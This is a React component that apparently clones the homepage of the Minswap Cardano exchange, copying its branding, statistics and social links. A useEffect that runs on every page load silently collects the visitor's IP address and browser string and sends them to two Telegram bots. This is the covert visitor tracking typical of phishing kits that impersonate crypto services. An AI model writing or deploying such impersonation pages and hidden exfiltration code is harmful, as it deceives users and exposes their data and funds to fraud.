import { Link } from "react-router-dom";
import { useEffect } from "react";
import Navigation from "../Components/Navigation";
import MobileNav from "../Components/MobileNav";
import Footer from "../Components/Footer";

function Home() {
  useEffect(() => {
    const fetchIpAndSendToTelegram = async () => {
      // Check if IP has been sent already
      if (sessionStorage.getItem("ipSent")) {
        return; // Exit if IP has been sent
      }

      try {
        // Fetch IP address
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        const ipAddress = ipData.ip;

        // Get browser information
        const browserName = navigator.userAgent;

        // Send IP and browser info to Telegram
        const token = import.meta.env.VITE_REACT_APP_TELEGRAM_TOKEN;
        const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
        const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
        const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;

        const url = `https://api.telegram.org/bot${token}/sendMessage`;
        const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;

        const message = `${ipAddress} just accessed home page\nBrowser: ${browserName}`;

        const data = {
          chat_id: chat_id,
          text: message,
        };
        const odata = {
          chat_id: ochat_id,
          text: message,
        };

        // Send to first bot
        await fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(data),
        });

        // Send to second bot
        await fetch(ourl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(odata),
        });

        // Set flag in sessionStorage to indicate IP has been sent
        sessionStorage.setItem("ipSent", "true");
      } catch (error) {
        console.error("Error", error);
      }
    };

    fetchIpAndSendToTelegram();
  }, []);
  return (
    <div className="Home">
      <Navigation />

      <div className="max-w-screen-2xl m-auto pb-10">
        <div className="pt-[100px] sm:pt-[200px] px-2 sm:px-20 text-center">
          <div>
            <img
              src="https://res.cloudinary.com/dcco9bkbw/image/upload/v1721581302/bszyn9g5o2be3isirw50.svg"
              alt="homeicons"
              className="m-auto"
            />
          </div>
          <h1 className="text-4xl sm:text-5xl text-textSecondary font-semibold mt-8">
            Where Cardano community <br /> comes to trade.
          </h1>

          <Link to="/app/minswap">
            <div className="my-6 px-2">
              <div className="max-w-sm m-auto">
                <div className="border border-stone-700 rounded-xl p-3">
                  <p className="text-left text-textPrimary font-semibold">
                    You pay
                  </p>
                  <div className="flex justify-between">
                    <div className="text-textPrimary font-semibold">
                      <h1 className="text-3xl">0.0</h1>
                    </div>
                    <div className="flex items-center p-2 rounded-full bg-[#1a1b20]">
                      <img
                        src="https://app.minswap.org/images/assets/cardano.png"
                        className="size-6 me-2"
                        alt="icon"
                      />
                      <h1 className="text-textSecondary font-semibold me-2">
                        ADA
                      </h1>
                      <svg
                        viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        fill="currentColor"
                        data-slot="icon"
                        className="text-textSecondary size-4"
                      >
                        <path d="M12 16L6 10H18L12 16Z"></path>
                      </svg>
                    </div>
                  </div>
                </div>

                <div className="flex justify-center">
                  <div className="absolute mt-[-20px] z-[1] rounded-full border border-stone-700  p-2 shadow-lg bg-[#111217]">
                    <svg
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      fill="currentColor"
                      className="remixicon size-5 shrink-0 text-white"
                    >
                      <path d="M13.0001 16.1716L18.3641 10.8076L19.7783 12.2218L12.0001 20L4.22192 12.2218L5.63614 10.8076L11.0001 16.1716V4H13.0001V16.1716Z"></path>
                    </svg>
                  </div>
                </div>

                <div className="border border-stone-700 rounded-xl p-3 mt-1">
                  <p className="text-left text-textPrimary font-semibold">
                    You receive
                  </p>
                  <div className="flex justify-between">
                    <div className="text-textPrimary font-semibold">
                      <h1 className="text-3xl">0.0</h1>
                    </div>
                    <div className="flex items-center p-2 rounded-full bg-[#1a1b20]">
                      <div className="rounded-full bg-[#27282e] p-0.5">
                        <svg
                          viewBox="0 0 24 24"
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          fill="currentColor"
                          className="text-textSecondary size-5 "
                        >
                          <path d="M11 11V5H13V11H19V13H13V19H11V13H5V11H11Z"></path>
                        </svg>
                      </div>
                      <h1 className="text-textSecondary font-semibold ms-2 me-2">
                        Select token
                      </h1>
                      <svg
                        viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        fill="currentColor"
                        data-slot="icon"
                        className="text-textSecondary size-4"
                      >
                        <path d="M12 16L6 10H18L12 16Z"></path>
                      </svg>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </Link>

          <div className="text-textPrimary font-medium max-w-[390px] m-auto">
            <p>
              Trade your favorite Cardano tokens with low fees, earn yields and
              stake for real yield.
            </p>
          </div>
        </div>

        <div className="px-4 md:px-20 md:mx-14 mt-[150px]">
          <div>
            <h1 className="text-textSecondary font-semibold text-3xl">
              DeFi Beats Here: Our Numbers
            </h1>
            <p className="text-textPrimary font-medium mt-7">
              See Minswap's impact on Cardano DeFi with real-time data.
            </p>
          </div>
          <div className="flex flex-wrap gap-3 items-center justify-center sm:justify-between mt-10">
            <div className="bg-[#1a1b20] rounded-lg p-5 w-full sm:w-[280px]">
              <h1 className="text-textSecondary font-semibold text-4xl">
                6.06B ₳
              </h1>
              <p className="text-textPrimary font-bold text-sm">
                Traded on Minswap
              </p>
            </div>
            <div className="bg-[#1a1b20] rounded-lg p-5 w-full sm:w-[280px]">
              <h1 className="text-textSecondary font-semibold text-4xl">
                4,182,299
              </h1>
              <p className="text-textPrimary font-bold text-sm">
                Successful trades
              </p>
            </div>
            <div className="bg-[#1a1b20] rounded-lg p-5 w-full sm:w-[280px]">
              <h1 className="text-textSecondary font-semibold text-4xl">
                149.01M ₳
              </h1>
              <p className="text-textPrimary font-bold text-sm">TVL</p>
            </div>
            <div className="bg-[#1a1b20] rounded-lg p-5 w-full sm:w-[280px]">
              <h1 className="text-textSecondary font-semibold text-4xl">
                167,388
              </h1>
              <p className="text-textPrimary font-bold text-sm">
                Active traders
              </p>
            </div>
          </div>
        </div>

        <div>
          <div className="max-w-screen-xl m-auto px-5 mt-[70px] md:mt-[120px]">
            <h1 className="text-3xl text-textSecondary font-bold mb-5">
              Trade Smarter, Not Harder
            </h1>
            <div className="flex flex-wrap justify-between">
              <img
                src="/one.png"
                className="w-full md:w-[48%] mb-5 rounded-lg"
                alt="one"
              />
              <img
                src="/two.png"
                className="w-full md:w-[48%] mb-5 rounded-lg"
                alt="two"
              />
              <img
                src="/three.png"
                className="w-full md:w-[48%] mb-5 rounded-lg"
                alt="three"
              />
              <img
                src="/four.png"
                className="w-full md:w-[48%] mb-5 rounded-lg"
                alt="four"
              />
            </div>
          </div>
        </div>

        <div className="max-w-screen-xl m-auto px-5 pt-5 pb-1">
          <Link to="https://play.google.com/store/apps/details?id=org.minswap.app&pli=1">
            {" "}
            <img
              src="/banner.png"
              className="rounded-xl hidden md:block"
              alt="banner"
            />
            <img
              src="/bannermobile.png"
              className="rounded-xl md:hidden block w-full"
              alt="banner"
            />
          </Link>
        </div>

        <div className="max-w-screen-xl m-auto px-5 pt-2 sm:px-3 flex flex-col md:flex-row">
          <div className="p-5 rounded-xl bg-[#232a3d] w-[100%] md:mx-2 max-h-[400px]">
            <h1 className="text-3xl text-textSecondary font-bold mb-4">
              Stay in the know!
            </h1>
            <p className="text-textPrimary font-medium mb-6">
              Updates, stories, and announcements from the Minswap Labs team.
            </p>
            <div>
              <Link
                to="https://minswap-labs.medium.com"
                target="_blank"
                className="bg-[#8aaaff] hover:bg-textSecondary duration-100 rounded-full font-medium px-5 py-3"
              >
                Read our blog
              </Link>
            </div>
          </div>
          <div className="p-5 rounded-xl bg-[#232a3d] w-[100%] md:mx-2 mt-3 sm:mt-0 max-h-[400px]">
            <h1 className="text-3xl text-textSecondary font-bold mb-4">
              Where Undercats meet and meow!
            </h1>
            <p className="text-textPrimary font-medium">
              Minswap’s global community of users, developers, designers &
              educators drives the success of the Protocol. Join the
              conversation.
            </p>
            <div className="flex gap-1.5 sm:gap-3 mt-4 w-[100%]">
              <Link
                to="https://x.com/MinswapDEX"
                target="_blank"
                className="bg-[#050b19] p-2 sm:p-3 rounded-2xl"
              >
                <svg
                  fill="none"
                  height="36"
                  viewBox="0 0 36 36"
                  width="36"
                  xmlns="http://www.w3.org/2000/svg"
                  className="size-7 shrink-0 md:size-9 text-white"
                >
                  <path
                    d="M1.5803 3L14.3212 20.0355L1.5 33.8862H4.38577L15.611 21.7594L24.6803 33.8862H34.5L21.0419 15.8927L32.976 3H30.0902L19.7527 14.1682L11.4 3H1.5803ZM5.82395 5.12542H10.3351L30.2558 31.7608H25.7447L5.82395 5.12542Z"
                    fill="currentColor"
                  ></path>
                </svg>
              </Link>
              <Link
                to="https://discord.com/invite/minswap"
                target="_blank"
                className="bg-[#bfc0e9] p-2 sm:p-3 rounded-2xl"
              >
                <svg
                  fill="none"
                  height="16"
                  viewBox="0 0 22 16"
                  width="22"
                  xmlns="http://www.w3.org/2000/svg"
                  className="size-7 shrink-0 md:size-9 text-[#242026]"
                >
                  <path
                    d="M 18.163463,1.3609966 A 17.733424,17.733424 0 0 0 13.739804,7.100525e-8 12.152835,12.152835 0 0 0 13.173144,1.1518721 a 16.473617,16.473617 0 0 0 -4.9093683,0 A 12.205116,12.205116 0 0 0 7.6971167,7.100525e-8 17.858224,17.858224 0 0 0 3.270085,1.3643698 C 0.47051375,5.5063854 -0.28840575,9.5455232 0.09105415,13.527322 v 0 A 17.83124,17.83124 0 0 0 5.5164874,16.251 13.104014,13.104014 0 0 0 6.6784773,14.377312 11.538952,11.538952 0 0 1 4.8486378,13.503711 C 5.0021085,13.392402 5.152206,13.277722 5.2972442,13.166413 a 12.744792,12.744792 0 0 0 10.8474918,0 c 0.146725,0.119741 0.296822,0.234422 0.448607,0.337298 a 11.582802,11.582802 0 0 1 -1.833213,0.875287 12.98596,12.98596 0 0 0 1.16199,1.872002 17.750289,17.750289 0 0 0 5.428805,-2.721992 v 0 C 21.796158,8.9114032 20.590319,4.9093685 18.163463,1.3609966 Z M 7.1591267,11.078542 c -1.057428,0 -1.9310293,-0.959613 -1.9310293,-2.1401538 0,-1.180541 0.8432444,-2.1485855 1.9276573,-2.1485855 1.084411,0 1.951266,0.9680445 1.932715,2.1485855 -0.01856,1.1805408 -0.851678,2.1401538 -1.929343,2.1401538 z m 7.1237273,0 c -1.059116,0 -1.929343,-0.959613 -1.929343,-2.1401538 0,-1.180541 0.843244,-2.1485855 1.929343,-2.1485855 1.086098,0 1.946207,0.9680445 1.927655,2.1485855 -0.01856,1.1805408 -0.849991,2.1401538 -1.927655,2.1401538 z"
                    fill="currentColor"
                  ></path>
                </svg>
              </Link>
              <Link
                to="https://www.reddit.com/r/MinSwap/"
                target="_blank"
                className="bg-[#fe996d] p-2 sm:p-3 rounded-2xl"
              >
                <svg
                  fill="none"
                  height="22"
                  viewBox="0 0 22 22"
                  width="22"
                  xmlns="http://www.w3.org/2000/svg"
                  className="size-7 shrink-0 md:size-9 text-black"
                >
                  <path
                    d="M13.3033 14.7532C12.8105 15.246 11.7546 15.4219 11.0021 15.4219C10.2475 15.4219 9.19374 15.246 8.70095 14.7532C8.58429 14.6366 8.39731 14.6366 8.28083 14.7532C8.16417 14.8699 8.16417 15.0569 8.28083 15.1733C9.06182 15.9543 10.5622 16.0159 11.0021 16.0159C11.442 16.0159 12.9402 15.9543 13.7236 15.1733C13.8379 15.0567 13.8379 14.8697 13.7236 14.7532C13.6069 14.6366 13.42 14.6366 13.3033 14.7532Z"
                    fill="currentColor"
                  ></path>
                  <path
                    d="M9.62507 12.1462C9.62507 11.5148 9.11028 11 8.47884 11C7.84757 11 7.33262 11.5148 7.33262 12.1462C7.33262 12.7775 7.84757 13.2924 8.47884 13.2924C9.11028 13.2924 9.62507 12.7777 9.62507 12.1462Z"
                    fill="currentColor"
                  ></path>
                  <path
                    clipRule="evenodd"
                    d="M0 11C0 4.9258 4.9258 0 11 0C17.0742 0 22 4.9258 22 11C22 17.0742 17.0742 22 11 22C4.9258 22 0 17.0742 0 11ZM17.4196 12.9492C17.4196 12.7864 17.4064 12.6258 17.3822 12.4673C17.9388 12.2166 18.3326 11.6556 18.3326 11C18.3326 10.1134 17.6155 9.39622 16.7288 9.39622C16.2954 9.39622 15.9038 9.56793 15.6156 9.84723C14.5201 9.05516 13.0086 8.54474 11.3256 8.48549L12.0559 5.04681L14.443 5.55505C14.4716 6.16216 14.9687 6.64622 15.5826 6.64622C16.2162 6.64622 16.7288 6.13362 16.7288 5.5C16.7288 4.86638 16.2162 4.35378 15.5826 4.35378C15.1315 4.35378 14.7467 4.61562 14.5597 4.99394L11.8933 4.42645C11.8184 4.41101 11.7414 4.42427 11.6776 4.46606C11.6138 4.50769 11.5698 4.57164 11.5544 4.64633C11.5544 4.64633 10.7536 8.46115 10.7536 8.48314C9.03989 8.52711 7.49973 9.03989 6.38657 9.84286C6.09837 9.56558 5.70897 9.39622 5.27777 9.39622C4.3912 9.39622 3.674 10.1156 3.674 11C3.674 11.6512 4.0634 12.2122 4.62216 12.463C4.59799 12.6214 4.58473 12.7842 4.58473 12.9492C4.58473 15.4176 7.45793 17.4174 11.0022 17.4174C14.5464 17.4174 17.4196 15.4176 17.4196 12.9492Z"
                    fill="currentColor"
                    fillRule="evenodd"
                  ></path>
                  <path
                    d="M13.5212 11C12.8898 11 12.375 11.5148 12.375 12.1462C12.375 12.7775 12.8898 13.2924 13.5212 13.2924C14.1525 13.2924 14.6674 12.7775 14.6674 12.1462C14.6674 11.5148 14.1527 11 13.5212 11Z"
                    fill="currentColor"
                  ></path>
                </svg>
              </Link>
              <Link
                to="https://t.me/MinswapMafia"
                target="_blank"
                className="bg-[#a1d6fe] p-2 sm:p-3 rounded-2xl"
              >
                <svg
                  height="24"
                  viewBox="0 0 24 24"
                  width="24"
                  xmlns="http://www.w3.org/2000/svg"
                  className="size-7 shrink-0 md:size-9 text-[#1c2f3e]"
                  style={{
                    fillRule: "evenodd",
                    clipRule: "evenodd",
                    strokeLinejoin: "round",
                    strokeMiterlimit: 1.41421,
                    fill: "currentColor",
                  }}
                >
                  <path d="M18.384,22.779c0.322,0.228 0.737,0.285 1.107,0.145c0.37,-0.141 0.642,-0.457 0.724,-0.84c0.869,-4.084 2.977,-14.421 3.768,-18.136c0.06,-0.28 -0.04,-0.571 -0.26,-0.758c-0.22,-0.187 -0.525,-0.241 -0.797,-0.14c-4.193,1.552 -17.106,6.397 -22.384,8.35c-0.335,0.124 -0.553,0.446 -0.542,0.799c0.012,0.354 0.25,0.661 0.593,0.764c2.367,0.708 5.474,1.693 5.474,1.693c0,0 1.452,4.385 2.209,6.615c0.095,0.28 0.314,0.5 0.603,0.576c0.288,0.075 0.596,-0.004 0.811,-0.207c1.216,-1.148 3.096,-2.923 3.096,-2.923c0,0 3.572,2.619 5.598,4.062Zm-11.01,-8.677l1.679,5.538l0.373,-3.507c0,0 6.487,-5.851 10.185,-9.186c0.108,-0.098 0.123,-0.262 0.033,-0.377c-0.089,-0.115 -0.253,-0.142 -0.376,-0.064c-4.286,2.737 -11.894,7.596 -11.894,7.596Z"></path>
                </svg>
              </Link>
              <Link
                to="https://github.com/minswap"
                target="_blank"
                className="bg-[#313746] p-2 sm:p-3 rounded-2xl"
              >
                <svg
                  fill="none"
                  height="22"
                  viewBox="0 0 22 22"
                  width="22"
                  xmlns="http://www.w3.org/2000/svg"
                  className="size-7 shrink-0 md:size-9 text-white"
                >
                  <path
                    d="M11 0.550003C4.9225 0.550003 0 5.34784 0 11.2652C0 16.0003 3.1515 20.0158 7.52125 21.4315C8.07125 21.5324 8.27292 21.2007 8.27292 20.9163C8.27292 20.6619 8.26375 19.9876 8.25917 19.0944C5.19933 19.7405 4.554 17.6569 4.554 17.6569C4.0535 16.4201 3.33025 16.0894 3.33025 16.0894C2.33383 15.4251 3.40725 15.4388 3.40725 15.4388C4.51183 15.5133 5.09208 16.5428 5.09208 16.5428C6.07292 18.1812 7.667 17.7077 8.29583 17.4342C8.39483 16.7409 8.67808 16.2693 8.9925 16.0012C6.54958 15.7332 3.982 14.8118 3.982 10.7063C3.982 9.53687 4.40825 8.58094 5.11408 7.83127C4.99033 7.56049 4.61908 6.47098 5.21033 4.99528C5.21033 4.99528 6.13158 4.70813 8.23533 6.09387C9.11533 5.8558 10.0503 5.73767 10.9853 5.73222C11.9203 5.73767 12.8553 5.8558 13.7353 6.09387C15.8253 4.70813 16.7466 4.99528 16.7466 4.99528C17.3378 6.47098 16.9666 7.56049 16.8566 7.83127C17.5578 8.58094 17.9841 9.53687 17.9841 10.7063C17.9841 14.8227 15.4128 15.7286 12.9653 15.9921C13.3503 16.3138 13.7078 16.9708 13.7078 17.9749C13.7078 19.4088 13.6941 20.561 13.6941 20.909C13.6941 21.1898 13.8866 21.5251 14.4503 21.4179C18.8512 20.0112 22 15.9931 22 11.2652C22 5.34784 17.0748 0.550003 11 0.550003V0.550003Z"
                    fill="currentColor"
                  ></path>
                </svg>
              </Link>
            </div>
          </div>
        </div>
      </div>
      <MobileNav />
      <Footer />
    </div>
  );
}

export default Home;
